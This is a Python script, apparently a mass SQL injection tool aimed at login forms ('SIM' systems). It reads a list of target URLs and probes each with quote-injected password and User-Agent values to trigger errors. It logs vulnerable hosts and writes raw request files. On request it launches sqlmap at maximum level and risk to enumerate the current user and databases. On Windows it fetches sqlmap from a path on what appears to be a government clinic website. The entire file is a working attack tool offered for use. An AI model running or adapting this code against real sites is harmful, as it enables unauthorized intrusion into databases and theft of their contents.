import os
import platform
import time
import requests
import wget
import sys
import re
from zipfile import ZipFile
from urllib.parse import urlparse

class c:
	res     = "\33[0m"
	b      = "\33[1m"
	r       = "\33[31m"
	g     = "\33[32m"
	y    = "\33[33m"

try:
    os.mkdir('output')

except:
    pass

def depen():
    os_plat = platform.system()
    if os_plat == 'Linux':
        with open('/etc/os-release') as cekos:
            l = cekos.read().splitlines()
            if l[6] == 'ID_LIKE=debian':
                xt = os.path.exists('/usr/bin/xterm')
                if xt == True:
                    pass
                elif xt == False:
                    if user == 0:
                        pass
                    else:
                        print(c.b + c.r + '[!] Something missing, run me with sudo to install missing requirements' + c.res)
                        sys.exit(1)
                    print(c.g + c.b +"[*] Installing xterm ..." + c.res)
                    os.system('apt install xterm -y')
                    BanSim()

            sqlmap = os.path.exists('/usr/share/sqlmap')
            if sqlmap == True:
                pass
            elif sqlmap == False:
                user = os.getuid()
                if user == 0:
                    pass
                else:
                    print(c.b + c.r + '[!] Something missing, run me with sudo to install missing requirements' + c.res)
                    sys.exit(1)
                print(c.g + c.b + "[*] Installing sqlmap ..." + c.res)
                os.system('apt install sqlmap -y')
                BanSim()
                
    elif os_plat == 'Windows':
        sqlwin = os.path.exists('.sqlmap')
        os.system('title Mass SIM SQL Injection - Coded by root@x-krypt0n-x - System of Pekalongan')
        if sqlwin == True:
            pass
        elif sqlwin == False:
            pwd = os.getcwd()
            print(c.r + c.b + "[!] Something missing, Try to download it ..." + c.res)
            print(c.g + c.b + "[*] Downloading ...")
            u = "http://puskesmaskajen1.pekalongankab.go.id/components/com_contenthistory/src/Controller/sqlmap-master.zip"
            down = wget.download(u, "requ.zip")
            print('\n' + c.res)
            BanSim()
            
            with ZipFile(pwd + "\\requ.zip", 'r') as eks:
                eks.extractall(path=pwd + "\\")
            os.rename('sqlmap-master', '.sqlmap')
            os.remove('requ.zip')
        else:
            print(c.b + c.r + "[!] Something wrong" + c.res)
    else:
        print('something wrong !')
def clear():
    if sys.platform.startswith("linux"):
        os.system('clear')
    elif sys.platform.startswith("freebsd"):
        os.system('clear')
    else:
        os.system('cls')

def BanSim():
    clear()
    print(c.b + """
                          ______
                       .-"      "-.
                      /            \               
                     |,  .-.  .-.  ,|
                     | )(_"""+ c.b + c.r +"""o""" + c.res + c.b +"""/  \"""" + c.b + c.r +"""o""" + c.res + c.b +"""_)( |
                     |/     /\     \|
           (@_       (_     ^^     _)
      _     ) \_______\__|IIIIII|__/_________________________
     (_)@8@8{}<________|-\IIIIII/-|__________________________>
            )_/        \          /
           (@           `--------`
           
           Coded by root@x-krypt0n-x | System of Pekalongan
                        SIM SQL INJECTION""" + c.res)

post_data = {"usr": "a", "pwd": "a", "FBD": "Masuk"} # post data yang akan dikirim ke server
param = {"user-agent": "Mozilla/5.0 (X11; Othros Linux System of Pekalongan x86_64; rv:78.0) Gecko/20100101 Firefox/78.0'"} # user-agent yang terinjeksi ' untuk mentrigger error 500}
post_data2 = {"usr": "a", "pwd": "a'", "FBD": "Masuk"} # post data yang terinjeksi ' untuk mentrigger error
param2 = {"user-agent": "Mozilla/5.0 (X11; Othros Linux System of Pekalongan x86_64; rv:78.0) Gecko/20100101 Firefox/78.0"} # user-agent yang tidak terinjeksi
    
BanSim()
depen()
Target = open(input("[*] List:~# "), 'r')
attack = input('[*] want to attack vulnerable target [Y/N]: ')

def Exploit(Target):
    for url_list in Target:
        url_list = url_list.strip()
        url_parse = urlparse(url_list)
        
        try:
            p = requests.post(url_list, data=post_data, headers=param)
            p2 = requests.post(url_list, data=post_data2, headers=param2)

            os_plat = platform.system()
            pattern = "<b>Fatal error</b>"
            content = str(p2.content)
            if p.status_code == 500:
                print(c.b + c.g + "[+] "+ url_list +" | Vuln SQL Injection in user-agent" + c.res)
                with open("output/vuln.txt", 'a') as w:
                    w.write(url_list + '\n')
                with open("output/post_" + url_parse[1] +".txt", 'a') as we:
                    we.write("""POST / HTTP/1.1\nHost: """+ url_parse[1] +"""\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0*\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 21\nOrigin: http://"""+ url_parse[1] +"""\nDNT: 1\nConnection: close\nReferer: http://"""+ url_parse[1] +"""/\nCookie: PHPSESSID=huvmumq33uu22oo2ml07indcdgtn3180qtv07kqhicabo0j9dqh0\nUpgrade-Insecure-Requests: 1\n\nusr=a&pwd=a&FBD=Masuk""")
                if attack == 'Y':
                    print(c.b + c.g +'[+] Attacking '+ url_parse[1] +' ...'+ c.res)
                    if os_plat == 'Windows':
                        os.system('start cmd /k "title Attacking '+ url_parse[1] + ' && python .sqlmap/sqlmap.py -r output/post_' + url_parse[1] + '.txt --threads=1 --level=5 --risk=3 --current-user --current-db --batch --dbs"')
                    elif os_plat == 'Linux':
                        os.system("xterm -xrm 'XTerm.vt100.allowTitleOps: false' -T 'Attacking "+ url_parse[1] +"' -e 'sqlmap -r output/post_"+ url_parse[1] +".txt --threads=10 --level=5 --risk=3 --time-sec=3 --batch --current-user --current-db --dbs && sleep 10'")
                        
                elif attack == 'y':
                    print(c.b + c.g +'[+] Attacking '+ url_parse[1] +' ...'+ c.res)
                    if os_plat == 'Windows':
                        os.system('start cmd /k "title Attacking '+ url_parse[1] + ' && python .sqlmap/sqlmap.py -r output/post_' + url_parse[1] + '.txt --threads=1 --level=5 --risk=3 --current-user --current-db --batch --dbs"')
                    elif os_plat == 'Linux':
                        os.system("xterm -xrm 'XTerm.vt100.allowTitleOps: false' -T 'Attacking "+ url_parse[1] +"' -e 'sqlmap -r output/post_"+ url_parse[1] +".txt --threads=10 --level=5 --risk=3 --time-sec=3 --batch --current-user --current-db --dbs && sleep 10'")
                        
                else:
                    pass

            elif (re.search(pattern, content)):
                print(c.b + c.g + "[+] " + url_list +" | Vuln SQL Injection in pwd paramater" + c.res)
                with open('output/vuln.txt', 'a') as w:
                    w.write(url_list + "\n")
                with open("output/post_" + url_parse[1] +".txt", 'a') as we:
                    we.write("""POST / HTTP/1.1\nHost: """+ url_parse[1] +"""\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 21\nOrigin: http://"""+ url_parse[1] +"""\nDNT: 1\nConnection: close\nReferer: http://"""+ url_parse[1] +"""/\nCookie: PHPSESSID=huvmumq33uu22oo2ml07indcdgtn3180qtv07kqhicabo0j9dqh0\nUpgrade-Insecure-Requests: 1\n\nusr=a&pwd=a*&FBD=Masuk""")
                if attack == 'Y':
                    print(c.b + c.g +'[+] Attacking '+ url_parse[1] +' ...'+ c.res)
                    if os_plat == 'Windows':
                        os.system('start cmd /k "title Attacking '+ url_parse[1] + ' && python .sqlmap/sqlmap.py -r output/post_' + url_parse[1] + '.txt --threads=1 --level=5 --risk=3 --current-user --current-db --batch --dbs"')
                    elif os_plat == 'Linux':
                        os.system("xterm -xrm 'XTerm.vt100.allowTitleOps: false' -T 'Attacking "+ url_parse[1] +"' -e 'sqlmap -r output/post_"+ url_parse[1] +".txt --threads=10 --level=5 --risk=3 --time-sec=3 --batch --current-user --current-db --dbs && sleep 10'")
                elif attack == 'y':
                    print(c.b + c.g +'[+] Attacking '+ url_parse[1] +' ...'+ c.res)
                    if os_plat == 'Windows':
                        os.system('start cmd /k "title Attacking '+ url_parse[1] + ' && python .sqlmap/sqlmap.py -r output/post_' + url_parse[1] + '.txt --threads=1 --level=5 --risk=3 --current-user --current-db --batch --dbs"')
                    elif os_plat == 'Linux':
                        os.system("xterm -xrm 'XTerm.vt100.allowTitleOps: false' -T 'Attacking "+ url_parse[1] +"' -e 'sqlmap -r output/post_"+ url_parse[1] +".txt --threads=10 --level=5 --risk=3 --time-sec=3 --batch --current-user --current-db --dbs && sleep 10'")
                        
                else:
                    pass
            else:
                print(c.b + c.r + "[-] "+ url_list +" | Not Vuln" + c.res)

        except KeyboardInterrupt:
            print(c.b + c.r + "[!] exit" + c.res)
            sys.exit(1)

print(c.y + "\n[*] output will save in" + c.b +" output/vuln.txt" + c.res)
print(c.y + "[*] output requests will save in" + c.b +" output/post_site.com.txt\n" + c.res)
Exploit(Target)
count_sim = len(open("output/vuln.txt").readlines())
print(c.b + c.g + "\n[!] "+ str(count_sim )+ " Site vuln with SQL Injection"+ c.res)
